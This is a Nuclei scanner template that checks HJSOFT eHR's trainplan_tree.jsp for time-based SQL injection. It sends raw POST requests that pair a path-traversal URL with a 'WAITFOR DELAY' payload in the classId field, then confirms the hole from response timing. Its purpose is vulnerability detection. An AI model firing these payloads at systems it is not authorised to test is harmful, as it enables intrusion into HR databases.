id: hjsoft-ehr-trainplan-tree-sqli
info:
  name: HJSOFT eHR trainplan_tree.jsp SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5, 9)}}'
  t2: '{{to_number(t1) + 2}}'
  t3: '{{rand_int(1, 4)}}'
  t4: '{{to_number(t3) + 2}}'

http:
  - raw:
      - |
        POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        classId=1;WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "title=\"trainType\""
          - "<?xml version"
      - type: dsl
        dsl:
          - duration >= t1 && duration <= t2
  
  - raw:
      - |
        POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        classId=1;WAITFOR DELAY '0:0:{{t3}}'--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "title=\"trainType\""
          - "<?xml version"
      - type: dsl
        dsl:
          - duration >= t3 && duration <= t4
